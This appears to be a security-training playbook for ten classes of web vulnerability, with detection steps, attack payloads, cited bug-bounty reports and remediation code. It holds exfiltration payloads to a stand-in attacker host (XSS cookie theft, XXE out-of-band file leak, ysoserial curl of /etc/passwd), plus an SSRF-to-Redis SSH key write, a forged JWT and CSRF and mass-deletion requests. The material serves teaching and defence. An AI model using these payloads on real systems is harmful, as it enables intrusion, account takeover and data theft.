# Advanced Vulnerability Playbook

A comprehensive guide with real-world examples for identifying, exploiting, and remediating common web vulnerabilities.

<p align="center">
  <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcmd2eGFqbnBiOXk2a2llOGRpdnV5cjY2dG15ZzZpcDR3dHJoN2hodiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o6Mb9rylU1hDEDBx6/giphy.gif" width="400px" alt="Hacking GIF">
</p>

## Table of Contents
- [SQL Injection](#sql-injection)
- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
- [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
- [XML External Entity (XXE)](#xml-external-entity-xxe)
- [Insecure Deserialization](#insecure-deserialization)
- [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
- [JWT Vulnerabilities](#jwt-vulnerabilities)
- [GraphQL Vulnerabilities](#graphql-vulnerabilities)
- [OAuth 2.0 Misconfigurations](#oauth-20-misconfigurations)
- [API Security Issues](#api-security-issues)

---

## SQL Injection

SQL Injection occurs when untrusted user input is incorporated into SQL queries without proper sanitization.

### Detection

**Manual Testing:**
1. Test single quotes (`'`) and double quotes (`"`)
2. Test SQL-specific syntax: `OR 1=1`, `UNION`, etc.
3. Watch for errors or behavior changes

**Automated Detection:**
```bash
# Using SQLmap
sqlmap -u "https://target.com/page?id=1" --dbs
sqlmap -u "https://target.com/page?id=1" --dbms=mysql --batch
```

### Real-World Example

**Scenario:** Login Bypass

**Vulnerable Code:**
```php
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "' AND password = '" . $_POST['password'] . "'";
$result = mysqli_query($connection, $query);
```

**Attack Input:**
```
username: admin' --
password: anything
```

**Resulting Query:**
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
```

**HackerOne Report:** [#198517 - SQL Injection in Zomato](https://hackerone.com/reports/198517)

### Remediation

1. **Use Parameterized Queries:**
```php
$stmt = $connection->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $_POST['username'], $_POST['password']);
$stmt->execute();
```

2. **Apply Input Validation**
3. **Use ORM Frameworks**
4. **Implement Least Privilege Database User**

---

## Cross-Site Scripting (XSS)

XSS allows attackers to inject client-side scripts into webpages viewed by other users.

### Types of XSS

1. **Reflected XSS:** Malicious script comes from the current HTTP request
2. **Stored XSS:** Malicious script is stored on the target server
3. **DOM-based XSS:** Vulnerability exists in client-side code

### Detection

**Manual Testing:**
- Insert simple payloads like `<script>alert(1)</script>`
- Test escape sequences for various contexts (HTML, JavaScript, CSS)

**Advanced Payloads:**
```javascript
// JavaScript URL context bypass
javascript:alert(1)

// Event handler
<img src="x" onerror="alert(1)">

// CSS-based XSS
<div style="background-image:url('javascript:alert(1)')">

// HTML5 vectors
<video><source onerror="alert(1)">
```

**Automated Tools:**
```bash
# Using DalFox
dalfox url "https://target.com/search?q=test"

# Using XSStrike
python xsstrike.py -u "https://target.com/page?param=test"
```

### Real-World Example

**Scenario:** Stored XSS in Comment System

**Vulnerable Code:**
```javascript
// Server renders HTML directly from user input
document.getElementById('comments').innerHTML += '<div class="comment">' + commentData.text + '</div>';
```

**Attack Input:**
```html
<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

**HackerOne Report:** [#1125425 - Stored XSS in Slack](https://hackerone.com/reports/1125425)

### Remediation

1. **Context-Specific Output Encoding:**
```javascript
// Use proper encoding libraries
const encodedComment = DOMPurify.sanitize(commentData.text);
document.getElementById('comments').innerHTML += '<div class="comment">' + encodedComment + '</div>';
```

2. **Implement Content Security Policy (CSP)**
3. **Validate input data**
4. **Use modern frameworks that auto-escape content**

---

## Server-Side Request Forgery (SSRF)

SSRF allows attackers to induce the server to make requests to an unintended location.

### Detection

**Common SSRF Targets:**
- Internal services: `localhost`, `127.0.0.1`, internal IPs
- Cloud metadata services: `169.254.169.254` (AWS), `metadata.google.internal` (GCP)
- File schemas: `file:///etc/passwd`

**Testing Techniques:**
1. Direct testing with internal URLs
2. Testing URL parsers with unusual formats
3. DNS rebinding attacks
4. Using Collaborator/Burp Collaborator to detect blind SSRF

**Automated Detection:**
```bash
# Using Nuclei Templates
nuclei -t ssrf.yaml -target https://target.com

# Using SSRFmap
python ssrfmap.py -r request.txt -p url -m readfiles
```

### Real-World Example

**Scenario:** SSRF in Image Processing Service

**Vulnerable Code:**
```python
from urllib.request import urlopen

def fetch_image(image_url):
    return urlopen(image_url).read()

# User-controlled URL
image_data = fetch_image(request.args.get('url'))
```

**Attack Payload:**
```
https://target.com/fetch-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
```

**HackerOne Report:** [#341876 - SSRF in Exchange leads to ROOT access](https://hackerone.com/reports/341876)

### Exploitation to RCE Chain

1. **Discover internal Redis instance:**
```
https://target.com/fetch-image?url=http://localhost:6379/
```

2. **Write SSH key to authorized_keys using Redis:**
```
https://target.com/fetch-image?url=redis://localhost:6379/
      CONFIG SET dir /home/user/.ssh/
      CONFIG SET dbfilename authorized_keys
      SET payload "\n\nssh-rsa AAAA...your-ssh-key...xyz user@attacker\n\n"
      SAVE
```

### Remediation

1. **Whitelist Allowed Domains/IPs**
2. **Block access to private IPs and localhost**
3. **Use specific SDK instead of generic HTTP clients**
4. **Deploy network-level protections**
5. **Configure proper cloud service ACLs**

---

## XML External Entity (XXE)

XXE attacks target applications that parse XML input and process external entity references.

### Detection

**Basic XXE Payload:**
```xml
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Blind XXE with Out-of-Band (OOB) Interaction:**
```xml
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>test</root>
```

**Hosted evil.dtd:**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
%send;
```

### Real-World Example

**Scenario:** XXE in SVG Upload Functionality

**Vulnerable Code:**
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
```

**Attack Vector:**
Upload an SVG file containing:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="40" x="0" y="16">&xxe;</text>
</svg>
```

**HackerOne Report:** [#231519 - XXE in Uber](https://hackerone.com/reports/231519)

### Remediation

1. **Disable External Entities:**
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
DocumentBuilder builder = factory.newDocumentBuilder();
```

2. **Use Alternative Data Formats (JSON)**
3. **Input Validation**
4. **Latest XML Processors**

---

## Insecure Deserialization

Insecure deserialization occurs when applications deserialize data from untrusted sources without verification.

### Detection

**Testing Approach:**
1. Identify serialization formats (Java, PHP, .NET, etc.)
2. Look for serialized data in requests/responses/cookies
3. Test by modifying serialized data

**Common Serialization Formats:**
- Java: Starts with `rO0` in Base64
- PHP: Has formats like `O:8:"UserInfo":2:{...}`
- .NET: Contains format markers like `AAEAAAD////`

### Real-World Example

**Scenario:** PHP Object Injection via Cookies

**Vulnerable Code:**
```php
// Cookie contains serialized object
$user = unserialize($_COOKIE['user_data']);
```

**Vulnerable Class:**
```php
class User {
    public $username;
    public $isAdmin = false;
    
    function __wakeup() {
        // Called during deserialization
        echo "User $this->username was deserialized";
    }
}
```

**Attack Payload:**
```php
// Generate malicious cookie
class User {
    public $username = "hacker";
    public $isAdmin = true;
}

$malicious = new User();
echo base64_encode(serialize($malicious));
// Result: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6ImhhY2tlciI7czo3OiJpc0FkbWluIjtiOjE7fQ==
```

**Advanced Java Deserialization with RCE:**
```bash
# Using ysoserial to generate payload
java -jar ysoserial.jar CommonsCollections5 'curl -d "$(cat /etc/passwd)" https://attacker.com' | base64
```

**HackerOne Report:** [#965052 - Java Deserialization in Uber](https://hackerone.com/reports/965052)

### Remediation

1. **Never deserialize untrusted data**
2. **Implement Integrity Checks (HMAC)**
3. **Use safe serialization formats (JSON with schema validation)**
4. **Deserialization filters (Java's ValidatingObjectInputStream)**
5. **Deploy WAF or RASP rules for common gadget chains**

---

## Cross-Site Request Forgery (CSRF)

CSRF attacks trick users into performing actions they didn't intend to perform.

### Detection

1. Identify state-changing operations (POST, PUT, DELETE)
2. Check for Anti-CSRF token implementation
3. Test if tokens are properly validated

**Sample CSRF PoC:**
```html
<html>
  <body>
    <form action="https://target.com/change-email" method="POST" id="exploit">
      <input type="hidden" name="email" value="hacker@evil.com" />
    </form>
    <script>
      document.getElementById("exploit").submit();
    </script>
  </body>
</html>
```

### Real-World Example

**Scenario:** CSRF to Change User's Email

**Vulnerable Endpoint:**
```
POST /api/update-profile
Content-Type: application/json

{"email":"user@example.com"}
```

**Issues:**
- No CSRF token
- Relies only on cookies for authentication
- Accepts requests from any origin

**HackerOne Report:** [#1238248 - CSRF in GitLab](https://hackerone.com/reports/1238248)

### Remediation

1. **Implement Anti-CSRF Tokens:**
```html
<form action="/api/change-email" method="post">
  <input type="hidden" name="csrf_token" value="random_token_tied_to_session" />
  <input type="email" name="email" />
  <button type="submit">Update</button>
</form>
```

2. **Use SameSite Cookie Attribute:**
```
Set-Cookie: session=123; SameSite=Strict; Secure; HttpOnly
```

3. **Custom Request Headers (For APIs)**
4. **Verify Origin/Referer Headers**
5. **Require Re-Authentication for Sensitive Actions**

---

## JWT Vulnerabilities

JSON Web Tokens (JWTs) are often vulnerable to various attacks when implemented incorrectly.

### Detection

**Common JWT Vulnerabilities:**
1. Weak signature algorithms (none, HS256 with weak key)
2. Token manipulation (changing alg field)
3. Weak or exposed secret keys
4. Missing signature validation

**Testing Approach:**
```bash
# Decode JWT
jwt-cli decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

# Test for 'none' algorithm bypass
jwt-cli encode --alg none '{"admin":true}' '' -S ''
```

### Real-World Example

**Scenario:** 'none' Algorithm Attack

**Original JWT:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlcklkIjoxMDAsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNTE2MjM5MDIyfQ.J5y2B7FV1Di04YWn_DYZKQhJ4ayHD0e7DL0QwEcxTXs
```

**Decoded Payload:**
```json
{
  "sub": "1234567890",
  "userId": 100,
  "role": "user",
  "iat": 1516239022
}
```

**Attack Payload:**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlcklkIjoxMDAsInJvbGUiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.
```

**HackerOne Report:** [#1003415 - JWT Key Injection Attack](https://hackerone.com/reports/1003415)

### Advanced Attack: RSA Key Confusion

1. Extract public key (certificate) from the target
2. Convert RSA public key to HMAC secret
3. Sign a malicious JWT with the public key as HMAC secret

```bash
# Using jwt_tool.py
python3 jwt_tool.py <token> -X k -pk public.pem
```

### Remediation

1. **Use Strong Algorithms (RS256, ES256)**
2. **Validate All Parts of the JWT**
3. **Set Proper Expiration (exp) and Not Before (nbf) Claims**
4. **Implement Key Rotation**
5. **Use Library-Specific Protections:**
```javascript
// Node.js with jsonwebtoken
jwt.verify(token, secret, { algorithms: ['RS256'] });
```

---

## GraphQL Vulnerabilities

GraphQL can introduce unique security challenges if not properly implemented.

### Detection

**Common Vulnerabilities:**
1. Introspection enabled in production
2. Missing query depth/complexity limits
3. Improper access controls
4. Information disclosure

**Testing Approach:**
```graphql
# Introspection query
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### Real-World Example

**Scenario:** Broken Access Control in GraphQL API

**Vulnerable Endpoint:**
```
POST /graphql
Content-Type: application/json

{
  "query": "query { user(id: 123) { id name email creditCardNumber } }"
}
```

**Issues:**
- No authorization check for accessing other users' data
- Excessive field exposure (creditCardNumber)

**Advanced Attack: Batching Attacks**
```graphql
[
  {"query": "mutation { deleteUser(id: 1) { success } }"},
  {"query": "mutation { deleteUser(id: 2) { success } }"},
  {"query": "mutation { deleteUser(id: 3) { success } }"}
]
```

**HackerOne Report:** [#1522626 - GraphQL Field Suggestions Leading to Sensitive Data](https://hackerone.com/reports/1522626)

### Remediation

1. **Disable Introspection in Production**
2. **Implement Query Depth Limiting:**
```javascript
// Using graphql-depth-limit
const depthLimit = require('graphql-depth-limit');

const server = new ApolloServer({
  schema,
  validationRules: [depthLimit(5)]
});
```

3. **Query Complexity Analysis**
4. **Field-Level Access Control**
5. **Rate Limiting**

---

## OAuth 2.0 Misconfigurations

OAuth 2.0 implementations often contain security flaws that can compromise authentication.

### Detection

**Common Vulnerabilities:**
1. Missing `state` parameter (CSRF vulnerability)
2. Improper redirect_uri validation
3. Token leakage via Referer header
4. Insecure token storage

**Testing Approach:**
1. Manipulate redirect_uri parameter
2. Check for state parameter usage
3. Test scope manipulations

### Real-World Example

**Scenario:** Open Redirect in OAuth Flow

**Vulnerable OAuth Implementation:**
```
GET /oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://attacker.com&response_type=code
```

**Issues:**
- No proper validation of redirect_uri 
- Allows redirection to arbitrary domains

**Attack Flow:**
1. Send victim link with malicious redirect_uri
2. Victim authenticates with the legitimate service
3. Authorization code is sent to attacker's domain
4. Attacker uses the code to obtain access token

**HackerOne Report:** [#665651 - Stealing Facebook OAuth Code Through Modified Redirect_URI](https://hackerone.com/reports/665651)

### Advanced Attack: Account Takeover Chain

1. Find XSS vulnerability on client application
2. Inject JavaScript to steal OAuth tokens from localStorage
3. Use stolen tokens to access victim's account

### Remediation

1. **Implement and Validate State Parameter:**
```php
// Generate state parameter
$state = bin2hex(random_bytes(16));
$_SESSION['oauth_state'] = $state;

// Verify state in callback
if ($_GET['state'] !== $_SESSION['oauth_state']) {
    die('Invalid state parameter');
}
```

2. **Whitelist Valid Redirect URIs**
3. **Use PKCE Extension for Public Clients**
4. **Short Expiration for Authorization Codes**
5. **Secure Token Storage (HttpOnly Cookies)**

---

## API Security Issues

Modern APIs face unique security challenges that require specific detection and remediation approaches.

### Detection

**Common API Vulnerabilities:**
1. Broken object-level authorization (BOLA/IDOR)
2. Broken authentication
3. Excessive data exposure
4. Lack of rate limiting
5. Mass assignment

**Testing Approach:**
1. Manipulate IDs in requests
2. Test for missing authentication
3. Check for sensitive data in responses
4. Automate requests to test rate limiting

### Real-World Example

**Scenario:** Insecure Direct Object Reference (IDOR)

**Vulnerable Endpoint:**
```
GET /api/v1/users/123/profile
Authorization: Bearer eyJ0eXAi...
```

**Attack:**
Simply changing the user ID to access another user's profile:
```
GET /api/v1/users/456/profile
Authorization: Bearer eyJ0eXAi...
```

**Mass Assignment Vulnerability:**
```
// Expected request
POST /api/users
{
  "name": "John Doe",
  "email": "john@example.com"
}

// Malicious request
POST /api/users
{
  "name": "Evil Admin",
  "email": "evil@example.com",
  "role": "admin",
  "verified": true
}
```

**HackerOne Report:** [#1342431 - Mass account takeovers using HTTP Request Smuggling](https://hackerone.com/reports/1342431)

### Remediation

1. **Implement Proper Authorization Checks:**
```javascript
// Express.js example
const authorizeUser = (req, res, next) => {
  const requestedUserId = req.params.userId;
  const currentUserId = req.user.id;
  
  // Check if the user has permission to access the resource
  if (currentUserId !== requestedUserId && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Unauthorized access' });
  }
  
  next();
};

app.get('/api/v1/users/:userId/profile', authorizeUser, (req, res) => {
  // Handle the request
});
```

2. **Use Allowlists for Mass Assignment Protection:**
```javascript
const allowedFields = ['name', 'email'];
const userData = {};

for (const field of allowedFields) {
  if (req.body[field] !== undefined) {
    userData[field] = req.body[field];
  }
}

// Only allowed fields will be used
User.create(userData);
```

3. **Implement Rate Limiting**
4. **Use API Gateways for Consistent Security Controls**
5. **Proper Error Handling (No Leaking of Sensitive Information)**

---

## Contributing

This playbook is a living document. If you have additional techniques, real-world examples, or remediation strategies, please contribute via pull requests.

## License

This document is licensed under the MIT License.

<p align="center">
  <i>Knowledge is meant to be shared. Hack responsibly.</i>
</p> 
